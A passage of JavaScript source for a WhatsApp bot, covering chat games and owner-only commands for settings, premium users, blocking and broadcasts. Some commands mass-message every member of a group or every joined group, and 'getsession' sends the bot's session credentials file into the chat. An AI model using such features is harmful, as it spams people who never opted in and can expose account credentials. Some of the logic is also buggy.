                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) DeepakBotInc.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            DeepakBotInc.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    DeepakBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    DeepakBotInc.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) DeepakBotInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) DeepakBotInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) DeepakBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    DeepakBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    replygcdeepak(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) DeepakBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    replygcdeepak(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) DeepakBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    DeepakBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
        
        //user db
        if (isCommand && !isUser) {
deepakverifieduser.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(deepakverifieduser, null, 2))
}
        
        switch (isCommand) {
            case 'addbadword': case 'addbd':
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (!groupAdmins) return replygcdeepak(mess.admin)
               if (args.length < 1) return replygcdeepak( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcdeepak('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (!groupAdmins) return replygcdeepak(mess.admin)
               if (args.length < 1) return replygcdeepak( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcdeepak('Successfully Deleted Bad Word!')
            break 
            case 'resetuser':
            case 'resetdbuser': {
               if (!DeepakTheCreator) return DeepakStickOwner()
               let totalusernya = db.data.users[0]
               replygcdeepak(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.data.users = []
            }
            break
            case 'resethit':
            case 'resettotalhit': {
               if (!DeepakTheCreator) return DeepakStickOwner()
               global.db.data.settings[botNumber].totalhit = 0
               replygcdeepak(mess.done)
            }
            break
            case 'setmenu':{
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (!text) return replygcdeepak(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12)\nPlease select one\nExample ${prefix + command} v1`)
               if (text.startsWith('v')) {
                  typemenu = text
                  replygcdeepak(mess.done)
               } else {
                  replygcdeepak(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12)\nPlease select one\nExample ${prefix + command} v1`)
               }
            }
            break
            case 'setreply':{
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (!text) return replygcdeepak(`There are 3 reply(v1,v2,v3,v4)\nPlease select 1\nExample ${prefix+command} v1`)
               if (text.startsWith('v')) {
                  typereply = text
                  replygcdeepak(mess.done)
               } else {
                  replygcdeepak(`There are 3 reply(v1,v2,v3,v4)\nPlease select 1\nExample ${prefix+command} v1`)
               }
            }
            break
            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (!q) return replygcdeepak('Text?')
               await DeepakBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               replygcdeepak(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                  await DeepakBotInc.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await replygcdeepak(mess.done)
               } else {
                  replygcdeepak('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                  await DeepakBotInc.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await replygcdeepak(mess.done)
               } else {
                  replygcdeepak('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                  await DeepakBotInc.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await replygcdeepak(mess.done)
               } else {
                  replygcdeepak('Reply to audio')
               }
            }
            break
            case 'setimgmenu':
            case 'sim': {
                if (!DeepakTheCreator) return DeepakStickOwner()
                let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './DeepakMedia/theme/Zenitsupic.jpg')
                fs.unlinkSync(delb)
                replygcdeepak(mess.done)
            }
            break
            case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!DeepakTheCreator) return DeepakStickOwner()
                let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './DeepakMedia/theme/Cheems-bot.mp4')
                fs.unlinkSync(delb)
                replygcdeepak(mess.done)
            }
            break
            case 'addtitle':{
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (!text) return replygcdeepak(`Usage ${prefix + command} number|title`)
               nonya = text.split('|')[0]
               titlenya = text.split('|')[1]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = titlenya
               await replygcdeepak(mess.done)
            }
            break
            case 'deltitle':{
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (!text) return replygcdeepak(`Usage ${prefix + command} number`)
               nonya = text.split(',')[0]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = ''
               await replygcdeepak(mess.done)
            }
            break
            case 'addlimit':
            case 'givelimit':{
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (!text) return replygcdeepak(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                db.data.users[oo].limit += limitnya
                replygcdeepak(mess.done)
            }
            break
            case 'dellimit':{
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (!text) return replygcdeepak(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygcdeepak(`His Limit Is Less Than ${limitnya}`)
                db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
                replygcdeepak(mess.done)
            }
            break
            case 'addprem':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 2)
                    return replygcdeepak(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    replygcdeepak("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    replygcdeepak("Premium Success")
                }
            break
            case 'delprem':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 918348225320`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    }
                    replygcdeepak("Delete Success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    replygcdeepak("Delete Success")
                }
            break
            case 'listprem': {
                if (!DeepakTheCreator) return DeepakStickOwner()
                let data = require('./src/data/role/premium.json')
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let x of data) {
                    txt += `Number : ${x.id}\n`
                    txt += `Expire In: ${x.expired} ms\n`
                DeepakBotInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'addowner':
if (!DeepakTheCreator) return DeepakStickOwner()
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await DeepakBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcdeepak(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcdeepak(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!DeepakTheCreator) return DeepakStickOwner()
if (!args[0]) return replygcdeepak(`Use ${prefix+command} nomor\nExample ${prefix+command} 918348225320`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcdeepak(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n┋⍟┃\n'
                for (let x of owner) {
                    teks += `┋⍟┃⭔ ${x}\n`
                }
                teks += `┋⍟┃\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygcdeepak(teks)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!DeepakTheCreator) return DeepakStickOwner()
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcdeepak('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcdeepak(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcdeepak(teks)
                    await sleep(2000)
                    replygcdeepak("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcdeepak("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!DeepakTheCreator) return DeepakStickOwner()
                    if (!text) return replygcdeepak('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcdeepak('Link Invalid!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    DeepakBotInc.groupAcceptInvite(result)
                    await replygcdeepak(`Done`)
                } catch {
                    replygcdeepak('Failed to join the Group')
                }
                break
            case 'getsession':
                if (!DeepakTheCreator) return DeepakStickOwner()
                replygcdeepak('Wait a moment, currently retrieving your session file')
                let sesi = fs.readFileSync('./session/creds.json')
                DeepakBotInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'myip':
            case 'ipbot':
                if (!DeepakTheCreator) return DeepakStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcdeepak("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
	if (!text) return replygcdeepak(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                DeepakBotInc.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            DeepakBotInc.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
            case 'shutdown':
                if (!DeepakTheCreator) return DeepakStickOwner()
                replygcdeepak(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
            break
            case 'autoread':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    replygcdeepak(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    replygcdeepak(`Successfully changed autoread to ${q}`)
                }
            break
            case 'unavailable':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    replygcdeepak(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    replygcdeepak(`Successfully changed unavailable to ${q}`)
                }
            break
            case 'autorecordtype':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecordtype = true
                    replygcdeepak(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
                    replygcdeepak(`Successfully changed Auto-RecordingTyping to ${q}`)
                }
            break
            case 'autorecord':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    replygcdeepak(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    replygcdeepak(`Successfully changed Auto-Recording to ${q}`)
                }
            break
            case 'autotype':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    replygcdeepak(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    replygcdeepak(`Successfully changed Auto-Typing to ${q}`)
                }
            break
            case 'autobio':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    replygcdeepak(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    replygcdeepak(`Successfully Changed AutoBio To ${q}`)
                }
            break
            case 'autosticker': case 'autostickergc':
if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autosticker = true
                    replygcdeepak(`Successfully Changed Auto Sticker To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autosticker = false
                    replygcdeepak(`Successfully Changed Auto Sticker To ${q}`)
                }
            break
            case 'autodownload': case 'autodl':
if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autodownload = true
                    replygcdeepak(`Successfully Changed Auto Download To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autodownload = false
                    replygcdeepak(`Successfully Changed Auto Download To ${q}`)
                }
            break
            case 'autoblock':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    replygcdeepak(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    replygcdeepak(`Successfully Changed Auto-Block To ${q}`)
                }
            break
            case 'onlygroup':
            case 'onlygc':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    replygcdeepak(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    replygcdeepak(`Successfully Changed Onlygroup To ${q}`)
                }
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    replygcdeepak(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    replygcdeepak(`Successfully Changed Only-Pc To ${q}`)
                }
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindia = true
                    replygcdeepak(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindia = false
                    replygcdeepak(`Successfully Changed Only-Indian To ${q}`)
                }
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindo = true
                    replygcdeepak(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindo = false
                    replygcdeepak(`Successfully Changed Only-Indonesian To ${q}`)
                }
            break
            case 'self': {
                if (!DeepakTheCreator) return DeepakStickOwner()
                DeepakBotInc.public = false
                replygcdeepak('*Successful in Changing To Self Usage*')
            }
            break
            case 'public': {
                if (!DeepakTheCreator) return DeepakStickOwner()
                DeepakBotInc.public = true
                replygcdeepak('*Successful in Changing To Public Usage*')
            }
            break
            case 'mode':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (args.length < 1) return replygcdeepak(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    DeepakBotInc.public = true
                    replygcdeepak(mess.done)
                } else if (q == 'self') {
                    DeepakBotInc.public = false
                    replygcdeepak(mess.done)
                }
            break
            case 'setexif':
            case 'setwm':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (!text) return replygcdeepak(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcdeepak(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
                case 'setprefix':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (!text) return replygcdeepak(`Example : ${prefix + command} packname|author`)
                global.xprefix = text
                replygcdeepak(`Prefix successfully changed to ${text}`)
                break
                case 'setautoblock':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (!text) return replygcdeepak(`Example : ${prefix + command} packname|author`)
                global.autoblocknumber = text
                replygcdeepak(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (!text) return replygcdeepak(`Example : ${prefix + command} packname|author`)
                global.antiforeignnumber = text
                replygcdeepak(`Anti-foreign number successfully changed to ${text}`)
                break
            case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (!quoted) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await DeepakBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await DeepakBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcdeepak(mess.done)
                } else {
                    var memeg = await DeepakBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcdeepak(mess.done)
                }
                break
            case 'leave':
            case 'out':
                if (!DeepakTheCreator) return DeepakStickOwner()
                if (!m.isGroup) return DeepakStickGroup()
                replygcdeepak('Bye Everyone 🥺')
                await DeepakBotInc.groupLeave(m.chat)
            break
            case 'bc':
            case 'broadcast': {
               if (!DeepakTheCreator) return DeepakStickOwner()
               if (!text) return replygcdeepak('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await DeepakBotInc.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await DeepakBotInc.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await DeepakBotInc.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygcdeepak(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
            }
            break
            case 'jpm': case 'post': {
if (!DeepakTheCreator) return DeepakStickOwner()
if (!text) return replygcdeepak(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await replygcdeepak(`Waiting in progress`)
let getGroups = await DeepakBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await DeepakBotInc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await DeepakBotInc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await DeepakBotInc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygcdeepak(`Success`)
}
break
            case 'pushcontact': {
    if (!DeepakTheCreator) return DeepakStickOwner()
      if (!m.isGroup) return replygcdeepak(`The feature works only in grup`)
    if (!text) return replygcdeepak(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcdeepak(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    DeepakBotInc.sendMessage(pler, { text: q})
     }  
     replygcdeepak(`Done`)
      }
      break
case "pushcontactv2":{
if (!DeepakTheCreator) return DeepakStickOwner()
if (!q) return replygcdeepak(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
await DeepakStickWait()
const metadata2 = await DeepakBotInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
DeepakBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcdeepak(`Success`)
}
break
case 'pushcontactv3':
if (!DeepakTheCreator) return DeepakStickOwner()
if (!isGroup) return DeepakStickGroup()
if (!text) return replygcdeepak(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await DeepakBotInc.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(1000)
await DeepakBotInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await DeepakBotInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
replygcdeepak(`Success`)
break
case 'block': case 'ban': {
		if (!DeepakTheCreator) return DeepakStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await DeepakBotInc.updateBlockStatus(users, 'block')
		await replygcdeepak(`Done`)
	}
	break
	case 'unblock': case 'unban': {
		if (!DeepakTheCreator) return DeepakStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await DeepakBotInc.updateBlockStatus(users, 'unblock')
		await replygcdeepak(`Done`)
	}
	break
            case 'bcgc':
            case 'bcgroup': {
                if (!DeepakTheCreator) return DeepakStickOwner()
